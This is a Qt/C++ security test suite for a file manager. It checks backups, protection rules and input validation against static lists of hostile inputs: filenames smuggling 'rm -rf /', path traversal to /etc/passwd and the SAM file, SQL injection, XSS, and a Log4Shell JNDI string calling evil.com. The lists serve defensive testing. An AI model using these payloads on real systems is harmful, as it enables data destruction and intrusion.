#include "security_safety_testing.h"
#include <QDir>
#include <QFile>
#include <QFileInfo>
#include <QStandardPaths>
#include <QCoreApplication>
#include <QDebug>
#include <QThread>
#include <QRandomGenerator>

// Static test data
const QStringList SecuritySafetyTesting::MALICIOUS_FILENAMES = {
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "con.txt",
    "prn.txt",
    "aux.txt",
    "nul.txt",
    "com1.txt",
    "lpt1.txt",
    "file<script>alert('xss')</script>.txt",
    "file\x00hidden.txt",
    "file\r\nhidden.txt",
    "file|rm -rf /.txt",
    "file;rm -rf /.txt",
    "file`rm -rf /`.txt",
    "file$(rm -rf /).txt",
    "file with spaces and unicode: 测试文件.txt",
    QString(260, 'a') + ".txt", // Very long filename
    ".hidden_system_file",
    "~backup_file.txt"
};

const QStringList SecuritySafetyTesting::PATH_TRAVERSAL_PATTERNS = {
    "../",
    "..\\",
    "....//",
    "....\\\\",
    "%2e%2e%2f",
    "%2e%2e%5c",
    "..%252f",
    "..%255c",
    "%c0%ae%c0%ae%c0%af",
    "%c1%9c",
    "\\..\\",
    "/..",
    "\\\\..\\\\",
    "//../../",
    "/./../../",
    "\\.\\..\\..\\",
    "file:///etc/passwd",
    "file://c:/windows/system32/config/sam"
};

const QStringList SecuritySafetyTesting::INJECTION_PATTERNS = {
    "'; DROP TABLE files; --",
    "' OR '1'='1",
    "'; DELETE FROM backups; --",
    "<script>alert('xss')</script>",
    "${jndi:ldap://evil.com/a}",
    "{{7*7}}",
    "<%=7*7%>",
    "${7*7}",
    "#{7*7}",
    "{{config}}",
    "{{request}}",
    "${env:PATH}",
    "file://etc/passwd",
    "data:text/html,<script>alert('xss')</script>",
    "javascript:alert('xss')",
    "vbscript:msgbox('xss')"
};

const QStringList SecuritySafetyTesting::SECURE_FILENAME_PATTERNS = {
    "document.txt",
    "image_001.jpg",
    "data-file.csv",
    "backup_2023-10-18.zip",
    "report_final_v2.pdf",
    "config.json",
    "readme.md",
    "test_file_123.dat"
};

SecuritySafetyTesting::SecuritySafetyTesting(QObject* parent)
    : QObject(parent)
    , m_testDir(nullptr)
    , m_safetyManager(nullptr)
    , m_fileManager(nullptr)
    , m_fileWatcher(nullptr)
{
    // Initialize default configurations
    m_safetyConfig.enableBackupValidation = true;
    m_safetyConfig.enableIntegrityChecking = true;
    m_safetyConfig.enablePermissionTesting = true;
    m_safetyConfig.enableProtectionRuleTesting = true;
    m_safetyConfig.maxTestFiles = 100;
    m_safetyConfig.maxTestFileSize = 10 * 1024 * 1024; // 10MB
    
    m_validationConfig.enablePathTraversalTests = true;
    m_validationConfig.enableInjectionTests = true;
    m_validationConfig.enableFileNameValidation = true;
    m_validationConfig.enableConfigValidation = true;
    m_validationConfig.maliciousPatterns = MALICIOUS_FILENAMES + PATH_TRAVERSAL_PATTERNS + INJECTION_PATTERNS;
    m_validationConfig.validPatterns = SECURE_FILENAME_PATTERNS;
    
    // Register metatypes
    qRegisterMetaType<SecurityTestCategory>("SecurityTestCategory");
    qRegisterMetaType<SecurityTestResult>("SecurityTestResult");
    qRegisterMetaType<SafetyTestConfig>("SafetyTestConfig");
    qRegisterMetaType<ValidationTestConfig>("ValidationTestConfig");
}

SecuritySafetyTesting::~SecuritySafetyTesting()
{
    cleanupTestEnvironment();
}

void SecuritySafetyTesting::setSafetyTestConfig(const SafetyTestConfig& config)
{
    m_safetyConfig = config;
}

void SecuritySafetyTesting::setValidationTestConfig(const ValidationTestConfig& config)
{
    m_validationConfig = config;
}

void SecuritySafetyTesting::setTestEnvironment(const QString& testDirectory)
{
    m_safetyConfig.testDataDirectory = testDirectory;
}

QList<SecuritySafetyTesting::SecurityTestResult> SecuritySafetyTesting::runAllSecurityTests()
{
    qDebug() << "Starting comprehensive security and safety testing...";
    
    m_testResults.clear();
    
    if (!setupTestEnvironment()) {
        SecurityTestResult setupResult;
        setupResult.testName = "Test Environment Setup";
        setupResult.category = SecurityTestCategory::FileOperationSafety;
        setupResult.passed = false;
        setupResult.errorMessage = "Failed to setup test environment";
        m_testResults << setupResult;
        return m_testResults;
    }
    
    // Run all test categories
    m_testResults << runFileOperationSafetyTests();
    m_testResults << runInputValidationTests();
    m_testResults << runSecurityAuditTests();
    
    qDebug() << "Security testing completed. Total tests:" << m_testResults.size();
    
    // Generate summary
    int passed = 0, failed = 0;
    for (const auto& result : m_testResults) {
        if (result.passed) passed++;
        else failed++;
    }
    
    qDebug() << "Test Summary - Passed:" << passed << "Failed:" << failed;
    
    return m_testResults;
}

QList<SecuritySafetyTesting::SecurityTestResult> SecuritySafetyTesting::runFileOperationSafetyTests()
{
    qDebug() << "\n=== File Operation Safety Tests ===";
    
    QList<SecurityTestResult> results;
    
    if (m_safetyConfig.enableBackupValidation) {
        results << testBackupCreationAndValidation();
    }
    
    if (m_safetyConfig.enablePermissionTesting) {
        results << testFilePermissionHandling();
    }
    
    if (m_safetyConfig.enableIntegrityChecking) {
        results << testDataIntegrityVerification();
    }
    
    if (m_safetyConfig.enableProtectionRuleTesting) {
        results << testProtectionRuleEnforcement();
    }
    
    return results;
}

QList<SecuritySafetyTesting::SecurityTestResult> SecuritySafetyTesting::runInputValidationTests()
{
    qDebug() << "\n=== Input Validation Tests ===";
    
    QList<SecurityTestResult> results;
    
    if (m_validationConfig.enablePathTraversalTests) {
        results << testPathTraversalPrevention();
    }
    
    if (m_validationConfig.enableInjectionTests) {
        results << testInjectionAttackPrevention();
    }
    
    if (m_validationConfig.enableFileNameValidation) {
        results << testFileNameValidation();
    }
    
    if (m_validationConfig.enableConfigValidation) {
        results << testConfigurationSecurity();
    }
    
    return results;
}

QList<SecuritySafetyTesting::SecurityTestResult> SecuritySafetyTesting::runSecurityAuditTests()
{
    qDebug() << "\n=== Security Audit Tests ===";
    
    QList<SecurityTestResult> results;
    
    results << testAuditTrailValidation();
    results << testEncryptionAndSecureStorage();
    
    return results;
}

SecuritySafetyTesting::SecurityTestResult SecuritySafetyTesting::testBackupCreationAndValidation()
{
    SecurityTestResult result;
    result.testName = "Backup Creation and Validation";
    result.category = SecurityTestCategory::FileOperationSafety;
    
    emit testStarted(result.testName, result.category);
    
    try {
        qDebug() << "Testing backup creation and validation...";
        
        // Create test files with known content
        QStringList testFiles;
        for (int i = 0; i < 5; i++) {
            QString content = generateSecureTestData(1024 * (i + 1)); // Varying sizes
            QString filePath = createTestFile(QString("backup_test/file_%1.txt").arg(i), content.toUtf8());
            if (!filePath.isEmpty()) {
                testFiles << filePath;
            }
        }
        
        if (testFiles.isEmpty()) {
            result.errorMessage = "Failed to create test files";
            return result;
        }
        
        result.metrics["test_files_created"] = testFiles.size();
        
        // Test backup creation for each file
        QStringList backupIds;
        for (const QString& filePath : testFiles) {
            QString backupId = m_safetyManager->createBackup(filePath, SafetyManager::BackupStrategy::CentralLocation);
            if (!backupId.isEmpty()) {
                backupIds << backupId;
            }
        }
        
        result.metrics["backups_created"] = backupIds.size();
        
        if (backupIds.size() != testFiles.size()) {
            result.errorMessage = QString("Expected %1 backups, got %2").arg(testFiles.size()).arg(backupIds.size());
            return result;
        }
        
        // Validate backup integrity
        int validBackups = 0;
        for (int i = 0; i < testFiles.size(); i++) {
            if (validateBackupIntegrity(testFiles[i], backupIds[i])) {
                validBackups++;
            }
        }
        
        result.metrics["valid_backups"] = validBackups;
        
        if (validBackups != testFiles.size()) {
            result.errorMessage = QString("Only %1 of %2 backups passed integrity check").arg(validBackups).arg(testFiles.size());
            return result;
        }
        
        // Test backup restoration
        int restoredFiles = 0;
        for (int i = 0; i < testFiles.size(); i++) {
            // Delete original file
            QFile::remove(testFiles[i]);
            
            // Restore from backup
            QString restoreTarget = testFiles[i] + ".restored";
            if (m_safetyManager->restoreFromBackup(backupIds[i], restoreTarget)) {
                if (validateFileIntegrity(testFiles[i], restoreTarget)) {
                    restoredFiles++;
                }
            }
        }
        
        result.metrics["restored_files"] = restoredFiles;
        
        if (restoredFiles != testFiles.size()) {
            result.errorMessage = QString("Only %1 of %2 files restored successfully").arg(restoredFiles).arg(testFiles.size());
            return result;
        }
        
        result.passed = true;
        qDebug() << "✓ Backup creation and validation test passed";
        
    } catch (const std::exception& e) {
        result.errorMessage = QString("Exception: %1").arg(e.what());
    } catch (...) {
        result.errorMessage = "Unknown exception occurred";
    }
    
    emit testCompleted(result);
    return result;
}

SecuritySafetyTesting::SecurityTestResult SecuritySafetyTesting::testFilePermissionHandling()
{
    SecurityTestResult result;
    result.testName = "File Permission Handling";
    result.category = SecurityTestCategory::AccessControl;
    
    emit testStarted(result.testName, result.category);
    
    try {
        qDebug() << "Testing file permission handling...";
        
        // Create test files with different permissions
        QString readOnlyFile = createTestFile("permission_test/readonly.txt", "Read-only content");
        QString writeableFile = createTestFile("permission_test/writeable.txt", "Writeable content");
        QString executableFile = createTestFile("permission_test/executable.txt", "Executable content");
        
        if (readOnlyFile.isEmpty() || writeableFile.isEmpty() || executableFile.isEmpty()) {
            result.errorMessage = "Failed to create test files";
            return result;
        }
        
        // Set different permissions
        QFile::setPermissions(readOnlyFile, QFile::ReadOwner | QFile::ReadGroup | QFile::ReadOther);
        QFile::setPermissions(writeableFile, QFile::ReadOwner | QFile::WriteOwner | QFile::ReadGroup | QFile::WriteGroup);
        QFile::setPermissions(executableFile, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner);
        
        // Test permission validation
        bool readOnlyTest = testFilePermissions(readOnlyFile, QFile::ReadOwner | QFile::ReadGroup | QFile::ReadOther);
        bool writeableTest = testFilePermissions(writeableFile, QFile::ReadOwner | QFile::WriteOwner | QFile::ReadGroup | QFile::WriteGroup);
        bool executableTest = testFilePermissions(executableFile, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner);
        
        result.metrics["readonly_test"] = readOnlyTest;
        result.metrics["writeable_test"] = writeableTest;
        result.metrics["executable_test"] = executableTest;
        
        // Test file operations respect permissions
        QStringList operationResults;
        
        // Try to delete read-only file (should require special handling)
        QString deleteOpId = m_fileManager->deleteFiles({readOnlyFile}, "Permission test - readonly");
        QSignalSpy operationSpy(m_fileManager, SIGNAL(operationCompleted(const FileManager::OperationResult&)));
        
        if (operationSpy.wait(5000)) {
            FileManager::OperationResult opResult = m_fileManager->getOperationResult(deleteOpId);
            operationResults << QString("ReadOnly deletion: %1").arg(opResult.success ? "Success" : "Failed");
        }
        
        // Try to delete writeable file (should succeed)
        deleteOpId = m_fileManager->deleteFiles({writeableFile}, "Permission test - writeable");
        if (operationSpy.wait(5000)) {
            FileManager::OperationResult opResult = m_fileManager->getOperationResult(deleteOpId);
            operationResults << QString("Writeable deletion: %1").arg(opResult.success ? "Success" : "Failed");
        }
        
        result.metrics["operation_results"] = operationResults;
        
        if (readOnlyTest && writeableTest && executableTest) {
            result.passed = true;
            qDebug() << "✓ File permission handling test passed";
        } else {
            result.errorMessage = "Permission validation failed";
        }
        
    } catch (const std::exception& e) {
        result.errorMessage = QString("Exception: %1").arg(e.what());
    } catch (...) {
        result.errorMessage = "Unknown exception occurred";
    }
    
    emit testCompleted(result);
    return result;
}

SecuritySafetyTesting::SecurityTestResult SecuritySafetyTesting::testDataIntegrityVerification()
{
    SecurityTestResult result;
    result.testName = "Data Integrity Verification";
    result.category = SecurityTestCategory::DataIntegrity;
    
    emit testStarted(result.testName, result.category);
    
    try {
        qDebug() << "Testing data integrity verification...";
        
        // Create test files with known checksums
        QStringList testFiles;
        QStringList expectedChecksums;
        
        for (int i = 0; i < 3; i++) {
            QString content = generateSecureTestData(2048);
            QString filePath = createTestFile(QString("integrity_test/file_%1.dat").arg(i), content.toUtf8());
            
            if (!filePath.isEmpty()) {
                testFiles << filePath;
                expectedChecksums << calculateFileChecksum(filePath);
            }
        }
        
        result.metrics["test_files"] = testFiles.size();
        result.metrics["expected_checksums"] = expectedChecksums;
        
        // Create backups and verify integrity
        int integrityPassed = 0;
        for (int i = 0; i < testFiles.size(); i++) {
            QString backupId = m_safetyManager->createBackup(testFiles[i]);
            
            // Wait for backup to complete
            QThread::msleep(100);
            
            // Verify backup integrity using SafetyManager
            SafetyManager::BackupVerification verification = m_safetyManager->verifyBackup(backupId, testFiles[i]);
            
            if (verification.isValid && 
                verification.originalChecksum == expectedChecksums[i] &&
                verification.originalChecksum == verification.backupChecksum) {
                integrityPassed++;
            } else {
                result.warnings << QString("Integrity check failed for file %1: %2").arg(i).arg(verification.errorMessage);
            }
        }
        
        result.metrics["integrity_passed"] = integrityPassed;
        
        // Test corruption detection
        if (!testFiles.isEmpty()) {
            QString corruptFile = testFiles.first() + ".corrupt";
            QFile::copy(testFiles.first(), corruptFile);
            
            // Corrupt the file
            QFile file(corruptFile);
            if (file.open(QIODevice::WriteOnly | QIODevice::Append)) {
                file.write("CORRUPTED_DATA");
                file.close();
            }
            
            QString corruptChecksum = calculateFileChecksum(corruptFile);
            bool corruptionDetected = (corruptChecksum != expectedChecksums.first());
            
            result.metrics["corruption_detected"] = corruptionDetected;
            
            if (!corruptionDetected) {
                result.warnings << "Failed to detect file corruption";
            }
        }
        
        if (integrityPassed == testFiles.size()) {
            result.passed = true;
            qDebug() << "✓ Data integrity verification test passed";
        } else {
            result.errorMessage = QString("Only %1 of %2 files passed integrity verification").arg(integrityPassed).arg(testFiles.size());
        }
        
    } catch (const std::exception& e) {
        result.errorMessage = QString("Exception: %1").arg(e.what());
    } catch (...) {
        result.errorMessage = "Unknown exception occurred";
    }
    
    emit testCompleted(result);
    return result;
}

SecuritySafetyTesting::SecurityTestResult SecuritySafetyTesting::testProtectionRuleEnforcement()
{
    SecurityTestResult result;
    result.testName = "Protection Rule Enforcement";
    result.category = SecurityTestCategory::ProtectionRules;
    
    emit testStarted(result.testName, result.category);
    
    try {
        qDebug() << "Testing protection rule enforcement...";
        
        // Create test files in different categories
        QString normalFile = createTestFile("protection_test/normal.txt", "Normal file content");
        QString systemFile = createTestFile("protection_test/system/critical.sys", "System file content");
        QString configFile = createTestFile("protection_test/config/app.conf", "Configuration content");
        QString importantFile = createTestFile("protection_test/important.backup", "Important backup content");
        
        // Add protection rules
        m_safetyManager->addProtectionRule("*/system/*", SafetyManager::ProtectionLevel::System, "System directory protection");
        m_safetyManager->addProtectionRule("*.conf", SafetyManager::ProtectionLevel::Critical, "Configuration file protection");
        m_safetyManager->addProtectionRule("*.backup", SafetyManager::ProtectionLevel::ReadOnly, "Backup file protection");
        
        result.metrics["protection_rules_added"] = 3;
        
        // Test protection level detection
        SafetyManager::ProtectionLevel normalLevel = m_safetyManager->getProtectionLevel(normalFile);
        SafetyManager::ProtectionLevel systemLevel = m_safetyManager->getProtectionLevel(systemFile);
        SafetyManager::ProtectionLevel configLevel = m_safetyManager->getProtectionLevel(configFile);
        SafetyManager::ProtectionLevel importantLevel = m_safetyManager->getProtectionLevel(importantFile);
        
        result.metrics["normal_protection"] = static_cast<int>(normalLevel);
        result.metrics["system_protection"] = static_cast<int>(systemLevel);
        result.metrics["config_protection"] = static_cast<int>(configLevel);
        result.metrics["important_protection"] = static_cast<int>(importantLevel);
        
        // Test operation validation
        bool normalAllowed = !m_safetyManager->isProtected(normalFile, SafetyManager::OperationType::Delete);
        bool systemProtected = m_safetyManager->isProtected(systemFile, SafetyManager::OperationType::Delete);
        bool configProtected = m_safetyManager->isProtected(configFile, SafetyManager::OperationType::Delete);
        bool importantProtected = m_safetyManager->isProtected(importantFile, SafetyManager::OperationType::Delete);
        
        result.metrics["normal_allowed"] = normalAllowed;
        result.metrics["system_protected"] = systemProtected;
        result.metrics["config_protected"] = configProtected;
        result.metrics["important_protected"] = importantProtected;
        
        // Test actual file operations
        QSignalSpy operationSpy(m_fileManager, SIGNAL(operationCompleted(const FileManager::OperationResult&)));
        QSignalSpy protectionSpy(m_safetyManager, &SafetyManager::protectionViolation);
        
        // Try to delete normal file (should succeed)
        QString normalOpId = m_fileManager->deleteFiles({normalFile}, "Protection test - normal");
        operationSpy.wait(3000);
        
        FileManager::OperationResult normalResult = m_fileManager->getOperationResult(normalOpId);
        
        // Try to delete protected files (should trigger protection)
        QString systemOpId = m_fileManager->deleteFiles({systemFile}, "Protection test - system");
        operationSpy.wait(3000);
        
        FileManager::OperationResult systemResult = m_fileManager->getOperationResult(systemOpId);
        
        result.metrics["normal_operation_success"] = normalResult.success;
        result.metrics["system_operation_success"] = systemResult.success;
        result.metrics["protection_violations"] = protectionSpy.count();
        
        // Validate protection enforcement
        bool protectionWorking = normalAllowed && systemProtected && configProtected && importantProtected;
        
        if (protectionWorking) {
            result.passed = true;
            qDebug() << "✓ Protection rule enforcement test passed";
        } else {
            result.errorMessage = "Protection rules not properly enforced";
        }
        
    } catch (const std::exception& e) {
        result.errorMessage = QString("Exception: %1").arg(e.what());
    } catch (...) {
        result.errorMessage = "Unknown exception occurred";
    }
    
    emit testCompleted(result);
    return result;
}

SecuritySafetyTesting::SecurityTestResult SecuritySafetyTesting::testPathTraversalPrevention()
{
    SecurityTestResult result;
    result.testName = "Path Traversal Prevention";
    result.category = SecurityTestCategory::InputValidation;
    
    emit testStarted(result.testName, result.category);
    
    try {
        qDebug() << "Testing path traversal prevention...";
        
        int maliciousInputsBlocked = 0;
        int totalMaliciousInputs = 0;
        
        // Test each path traversal pattern
        for (const QString& pattern : PATH_TRAVERSAL_PATTERNS) {
            totalMaliciousInputs++;
            
            // Test with FileManager path validation
            bool isValidPath = FileManager::validateFilePath(pattern);
            
            // Test creating files with malicious paths
            QString testPath = m_testPath + "/" + pattern + "malicious.txt";
            bool fileCreated = false;
            
            QFile testFile(testPath);
            if (testFile.open(QIODevice::WriteOnly)) {
                testFile.write("malicious content");
                testFile.close();
                fileCreated = true;
                
                // Clean up if file was created
                QFile::remove(testPath);
            }
            
            // Test with SafetyManager validation
            bool operationAllowed = m_safetyManager->validateOperation(
                SafetyManager::OperationType::Create, testPath);
            
            if (!isValidPath || !fileCreated || !operationAllowed) {
                maliciousInputsBlocked++;
            } else {
                result.warnings << QString("Path traversal not blocked: %1").arg(pattern);
                emit securityViolationDetected("Path traversal attempt", pattern);
            }
        }
        
        result.metrics["total_malicious_inputs"] = totalMaliciousInputs;
        result.metrics["malicious_inputs_blocked"] = maliciousInputsBlocked;
        result.metrics["block_rate"] = totalMaliciousInputs > 0 ? 
            (double)maliciousInputsBlocked / totalMaliciousInputs * 100.0 : 0.0;
        
        // Test legitimate paths are allowed
        QStringList legitimatePaths = {
            "documents/file.txt",
            "images/photo.jpg",
            "data/backup.zip",
            "config/settings.json"
        };
        
        int legitimatePathsAllowed = 0;
        for (const QString& path : legitimatePaths) {
            if (FileManager::validateFilePath(path)) {
                legitimatePathsAllowed++;
            }
        }
        
        result.metrics["legitimate_paths_allowed"] = legitimatePathsAllowed;
        result.metrics["legitimate_paths_total"] = legitimatePaths.size();
        
        // Success criteria: block most malicious inputs, allow legitimate ones
        double blockRate = result.metrics["block_rate"].toDouble();
        bool legitimateAllowed = (legitimatePathsAllowed == legitimatePaths.size());
        
        if (blockRate >= 90.0 && legitimateAllowed) {
            result.passed = true;
            qDebug() << "✓ Path traversal prevention test passed";
        } else {
            result.errorMessage = QString("Insufficient protection - Block rate: %1%, Legitimate allowed: %2")
                .arg(blockRate).arg(legitimateAllowed);
        }
        
    } catch (const std::exception& e) {
        result.errorMessage = QString("Exception: %1").arg(e.what());
    } catch (...) {
        result.errorMessage = "Unknown exception occurred";
    }
    
    emit testCompleted(result);
    return result;
}

SecuritySafetyTesting::SecurityTestResult SecuritySafetyTesting::testInjectionAttackPrevention()
{
    SecurityTestResult result;
    result.testName = "Injection Attack Prevention";
    result.category = SecurityTestCategory::InputValidation;
    
    emit testStarted(result.testName, result.category);
    
    try {
        qDebug() << "Testing injection attack prevention...";
        
        int injectionAttacksBlocked = 0;
        int totalInjectionAttempts = 0;
        
        // Test each injection pattern
        for (const QString& pattern : INJECTION_PATTERNS) {
            totalInjectionAttempts++;
            
            bool attackBlocked = testMaliciousInput(pattern, "injection_test");
            
            if (attackBlocked) {
                injectionAttacksBlocked++;
            } else {
                result.warnings << QString("Injection attack not blocked: %1").arg(pattern);
                emit securityViolationDetected("Injection attack attempt", pattern);
            }
        }
        
        result.metrics["total_injection_attempts"] = totalInjectionAttempts;
        result.metrics["injection_attacks_blocked"] = injectionAttacksBlocked;
        result.metrics["injection_block_rate"] = totalInjectionAttempts > 0 ? 
            (double)injectionAttacksBlocked / totalInjectionAttempts * 100.0 : 0.0;
        
        // Test input sanitization
        QStringList testInputs = {
            "<script>alert('test')</script>",
            "'; DROP TABLE test; --",
            "${jndi:ldap://test.com/a}",
            "{{7*7}}"
        };
        
        int sanitizedInputs = 0;
        for (const QString& input : testInputs) {
            // Test with a hypothetical sanitization function
            QString sanitized = input;
            sanitized.remove(QRegularExpression("[<>\"';&${}]"));
            
            if (validateInputSanitization(input, sanitized)) {
                sanitizedInputs++;
            }
        }
        
        result.metrics["sanitized_inputs"] = sanitizedInputs;
        result.metrics["sanitization_rate"] = testInputs.size() > 0 ? 
            (double)sanitizedInputs / testInputs.size() * 100.0 : 0.0;
        
        double injectionBlockRate = result.metrics["injection_block_rate"].toDouble();
        double sanitizationRate = result.metrics["sanitization_rate"].toDouble();
        
        if (injectionBlockRate >= 85.0 && sanitizationRate >= 80.0) {
            result.passed = true;
            qDebug() << "✓ Injection attack prevention test passed";
        } else {
            result.errorMessage = QString("Insufficient protection - Injection block rate: %1%, Sanitization rate: %2%")
                .arg(injectionBlockRate).arg(sanitizationRate);
        }
        
    } catch (const std::exception& e) {
        result.errorMessage = QString("Exception: %1").arg(e.what());
    } catch (...) {
        result.errorMessage = "Unknown exception occurred";
    }
    
    emit testCompleted(result);
    return result;
}

SecuritySafetyTesting::SecurityTestResult SecuritySafetyTesting::testFileNameValidation()
{
    SecurityTestResult result;
    result.testName = "File Name Validation";
    result.category = SecurityTestCategory::InputValidation;
    
    emit testStarted(result.testName, result.category);
    
    try {
        qDebug() << "Testing file name validation...";
        
        int maliciousNamesBlocked = 0;
        int secureNamesAllowed = 0;
        
        // Test malicious filenames
        for (const QString& filename : MALICIOUS_FILENAMES) {
            bool isSecure = isSecureFileName(filename);
            if (!isSecure) {
                maliciousNamesBlocked++;
            } else {
                result.warnings << QString("Malicious filename not blocked: %1").arg(filename);
            }
        }
        
        // Test secure filenames
        for (const QString& filename : SECURE_FILENAME_PATTERNS) {
            bool isSecure = isSecureFileName(filename);
            if (isSecure) {
                secureNamesAllowed++;
            } else {
                result.warnings << QString("Secure filename blocked: %1").arg(filename);
            }
        }
        
        result.metrics["malicious_names_blocked"] = maliciousNamesBlocked;
        result.metrics["total_malicious_names"] = MALICIOUS_FILENAMES.size();
        result.metrics["secure_names_allowed"] = secureNamesAllowed;
        result.metrics["total_secure_names"] = SECURE_FILENAME_PATTERNS.size();
        
        double maliciousBlockRate = MALICIOUS_FILENAMES.size() > 0 ? 
            (double)maliciousNamesBlocked / MALICIOUS_FILENAMES.size() * 100.0 : 0.0;
        double secureAllowRate = SECURE_FILENAME_PATTERNS.size() > 0 ? 
            (double)secureNamesAllowed / SECURE_FILENAME_PATTERNS.size() * 100.0 : 0.0;
        
        result.metrics["malicious_block_rate"] = maliciousBlockRate;
        result.metrics["secure_allow_rate"] = secureAllowRate;
        
        if (maliciousBlockRate >= 90.0 && secureAllowRate >= 95.0) {
            result.passed = true;
            qDebug() << "✓ File name validation test passed";
        } else {
            result.errorMessage = QString("Insufficient validation - Malicious block rate: %1%, Secure allow rate: %2%")
                .arg(maliciousBlockRate).arg(secureAllowRate);
        }
        
    } catch (const std::exception& e) {
        result.errorMessage = QString("Exception: %1").arg(e.what());
    } catch (...) {
        result.errorMessage = "Unknown exception occurred";
    }
    
    emit testCompleted(result);
    return result;
}

SecuritySafetyTesting::SecurityTestResult SecuritySafetyTesting::testConfigurationSecurity()
{
    SecurityTestResult result;
    result.testName = "Configuration Security";
    result.category = SecurityTestCategory::InputValidation;
    
    emit testStarted(result.testName, result.category);
    
    try {
        qDebug() << "Testing configuration security...";
        
        // Create test configuration files
        QString secureConfig = createTestFile("config_test/secure.conf", 
            "backup_directory=/safe/path\n"
            "max_file_size=1048576\n"
            "enable_logging=true\n");
            
        QString maliciousConfig = createTestFile("config_test/malicious.conf",
            "backup_directory=../../../etc/passwd\n"
            "max_file_size=999999999999\n"
            "enable_logging=false\n"
            "command=rm -rf /\n"
            "script=<script>alert('xss')</script>\n");
        
        if (secureConfig.isEmpty() || maliciousConfig.isEmpty()) {
            result.errorMessage = "Failed to create test configuration files";
            return result;
        }
        
        // Test configuration validation (simulated)
        bool secureConfigValid = true;
        bool maliciousConfigBlocked = false;
        
        // Read and validate configurations
        QFile secureFile(secureConfig);
        if (secureFile.open(QIODevice::ReadOnly)) {
            QStringList lines = QString::fromUtf8(secureFile.readAll()).split('\n');
            for (const QString& line : lines) {
                if (line.contains("../") || line.contains("..\\") || 
                    line.contains("<script>") || line.contains("rm -rf")) {
                    secureConfigValid = false;
                    break;
                }
            }
            secureFile.close();
        }
        
        QFile maliciousFile(maliciousConfig);
        if (maliciousFile.open(QIODevice::ReadOnly)) {
            QStringList lines = QString::fromUtf8(maliciousFile.readAll()).split('\n');
            for (const QString& line : lines) {
                if (line.contains("../") || line.contains("..\\") || 
                    line.contains("<script>") || line.contains("rm -rf") ||
                    line.contains("command=") || line.contains("script=")) {
                    maliciousConfigBlocked = true;
                    break;
                }
            }
            maliciousFile.close();
        }
        
        result.metrics["secure_config_valid"] = secureConfigValid;
        result.metrics["malicious_config_blocked"] = maliciousConfigBlocked;
        
        // Test configuration file permissions
        QFile::Permissions securePerms = QFile::permissions(secureConfig);
        QFile::Permissions maliciousPerms = QFile::permissions(maliciousConfig);
        
        bool securePermissions = !(securePerms & QFile::ExeOwner) && 
                                !(securePerms & QFile::ExeGroup) && 
                                !(securePerms & QFile::ExeOther);
        
        result.metrics["secure_permissions"] = securePermissions;
        
        // Test configuration parsing safety
        QStringList configTests = {
            "valid_key=valid_value",
            "key_with_injection='; DROP TABLE config; --",
            "path_traversal=../../../etc/passwd",
            "script_injection=<script>alert('test')</script>",
            "command_injection=$(rm -rf /)",
            "buffer_overflow=" + QString(10000, 'A')
        };
        
        int safeConfigsParsed = 0;
        for (const QString& configLine : configTests) {
            // Simulate safe configuration parsing
            if (!configLine.contains("DROP TABLE") && 
                !configLine.contains("../") &&
                !configLine.contains("<script>") &&
                !configLine.contains("$(") &&
                configLine.length() < 1000) {
                safeConfigsParsed++;
            }
        }
        
        result.metrics["safe_configs_parsed"] = safeConfigsParsed;
        result.metrics["total_config_tests"] = configTests.size();
        
        if (secureConfigValid && maliciousConfigBlocked && securePermissions && safeConfigsParsed >= 1) {
            result.passed = true;
            qDebug() << "✓ Configuration security test passed";
        } else {
            result.errorMessage = "Configuration security validation failed";
        }
        
    } catch (const std::exception& e) {
        result.errorMessage = QString("Exception: %1").arg(e.what());
    } catch (...) {
        result.errorMessage = "Unknown exception occurred";
    }
    
    emit testCompleted(result);
    return result;
}

SecuritySafetyTesting::SecurityTestResult SecuritySafetyTesting::testAuditTrailValidation()
{
    SecurityTestResult result;
    result.testName = "Audit Trail Validation";
    result.category = SecurityTestCategory::SecurityAudit;
    
    emit testStarted(result.testName, result.category);
    
    try {
        qDebug() << "Testing audit trail validation...";
        
        // Create test files for operations
        QString testFile1 = createTestFile("audit_test/file1.txt", "Audit test content 1");
        QString testFile2 = createTestFile("audit_test/file2.txt", "Audit test content 2");
        
        if (testFile1.isEmpty() || testFile2.isEmpty()) {
            result.errorMessage = "Failed to create test files";
            return result;
        }
        
        // Perform operations that should be audited
        QStringList operationIds;
        
        // Register operations with SafetyManager
        QString op1 = m_safetyManager->registerOperation(SafetyManager::OperationType::Delete, testFile1, "", "Audit test deletion 1");
        QString op2 = m_safetyManager->registerOperation(SafetyManager::OperationType::Delete, testFile2, "", "Audit test deletion 2");
        
        operationIds << op1 << op2;
        
        // Finalize operations
        m_safetyManager->finalizeOperation(op1, true, "backup_path_1");
        m_safetyManager->finalizeOperation(op2, true, "backup_path_2");
        
        result.metrics["operations_registered"] = operationIds.size();
        
        // Validate audit trail exists
        int validAuditEntries = 0;
        for (const QString& opId : operationIds) {
            if (validateAuditTrail(opId)) {
                validAuditEntries++;
            }
        }
        
        result.metrics["valid_audit_entries"] = validAuditEntries;
        
        // Test audit trail completeness
        QList<SafetyManager::SafetyOperation> history = m_safetyManager->getUndoHistory(10);
        
        int auditedOperations = 0;
        for (const auto& operation : history) {
            if (operationIds.contains(operation.operationId)) {
                auditedOperations++;
                
                // Validate audit entry completeness
                if (!operation.sourceFile.isEmpty() && 
                    !operation.reason.isEmpty() &&
                    operation.timestamp.isValid()) {
                    // Audit entry is complete
                } else {
                    result.warnings << QString("Incomplete audit entry for operation %1").arg(operation.operationId);
                }
            }
        }
        
        result.metrics["audited_operations"] = auditedOperations;
        
        // Test audit trail integrity
        bool auditIntegrityValid = checkSecurityCompliance();
        result.metrics["audit_integrity_valid"] = auditIntegrityValid;
        
        // Generate audit events
        emit auditEventGenerated("Security test completed", {
            {"test_name", result.testName},
            {"operations_tested", operationIds.size()},
            {"timestamp", QDateTime::currentDateTime()}
        });
        
        if (validAuditEntries == operationIds.size() && auditedOperations >= operationIds.size() && auditIntegrityValid) {
            result.passed = true;
            qDebug() << "✓ Audit trail validation test passed";
        } else {
            result.errorMessage = QString("Audit trail validation failed - Valid entries: %1/%2, Audited ops: %3/%4")
                .arg(validAuditEntries).arg(operationIds.size())
                .arg(auditedOperations).arg(operationIds.size());
        }
        
    } catch (const std::exception& e) {
        result.errorMessage = QString("Exception: %1").arg(e.what());
    } catch (...) {
        result.errorMessage = "Unknown exception occurred";
    }
    
    emit testCompleted(result);
    return result;
}

